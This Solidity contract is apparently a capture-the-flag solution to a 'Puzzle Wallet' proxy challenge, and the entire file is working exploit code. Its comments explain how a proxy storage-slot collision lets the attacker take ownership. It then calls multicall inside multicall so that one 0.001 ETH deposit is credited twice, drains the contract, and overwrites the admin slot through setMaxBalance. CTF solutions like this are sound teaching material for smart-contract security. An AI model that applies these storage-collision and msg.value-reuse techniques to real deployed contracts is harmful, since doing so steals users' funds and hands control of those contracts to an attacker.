// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./IPuzzleWallet.sol";

contract PuzzleWalletAttack {
    address public owner;
    address public target;

    constructor(address _target) {
        owner = msg.sender;
        target = _target;
    }

    function exploit() external payable {
        require(msg.sender == owner, "not owner");

        // Step 1: Call proposeNewAdmin(us) on the proxy
        // This writes our address to slot 0
        // In PuzzleWallet's storage layout, slot 0 = owner
        // So now we are the "owner" of the wallet
        IPuzzleProxy(target).proposeNewAdmin(address(this));

        // Step 2: As owner, whitelist ourselves so we can call deposit/multicall/execute
        IPuzzleWallet(target).addToWhitelist(address(this));

        // Step 3: Drain the contract's 0.001 ETH using the multicall trick
        // The contract has 0.001 ETH. We need to make our balance = 0.002 ETH
        // while only sending 0.001 ETH, then withdraw 0.002 ETH to drain it.
        //
        // multicall checks that deposit() is only called once per multicall.
        // But we can nest: multicall([deposit, multicall([deposit])])
        // Both deposits use the same msg.value, so we get credited 0.002 ETH
        // while only sending 0.001 ETH.

        bytes[] memory depositCall = new bytes[](1);
        depositCall[0] = abi.encodeWithSelector(IPuzzleWallet.deposit.selector);

        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(IPuzzleWallet.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(IPuzzleWallet.multicall.selector, depositCall);

        IPuzzleWallet(target).multicall{value: 0.001 ether}(nestedMulticall);

        // Step 4: Withdraw all 0.002 ETH (our fake balance) — drains the contract to 0
        IPuzzleWallet(target).execute(owner, 0.002 ether, "");

        // Step 5: Now that balance is 0, we can call setMaxBalance
        // setMaxBalance writes to slot 1, which is the proxy's "admin" slot
        // We pass our address as a uint256 to become admin
        IPuzzleWallet(target).setMaxBalance(uint256(uint160(owner)));
    }

    receive() external payable {}
}
